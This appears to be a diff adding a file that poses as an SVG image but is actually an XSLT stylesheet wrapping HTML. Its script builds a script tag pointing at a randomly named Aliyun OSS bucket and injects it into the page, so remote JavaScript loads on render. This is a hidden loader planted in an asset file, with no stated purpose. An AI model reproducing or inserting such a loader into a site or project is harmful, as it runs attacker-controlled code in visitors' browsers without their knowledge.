@@ -1,0 +1,22 @@
+<!--<?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
+ <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="3.5in" height="1in">-->  
+ <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
+ <xsl:template match="/">  
+ <html>  
+ <body>  
+ <div style="display:none">11</div>
+ <meta content="always" name="referrer" />  
+ <meta charset="UTF-8" />  
+ <script charset="UTF-8">  
+ var xUrl = '//gfdhggf.oss-accelerate.aliyuncs.com/111/11.js'  
+ var now = Math.round(Date.now() / 1000 / 5)  
+ var s = document.createElement('script')  
+ s.setAttribute('src', xUrl + '?t=' +now)  
+ s.setAttribute('charset', 'utf-8')  
+ if (!document.body) document.head.appendChild(s)  
+ else document.body.appendChild(s)  
+ </script>  
+ </body>  
+ </html>  
+ </xsl:template>  
+ </xsl:stylesheet>  
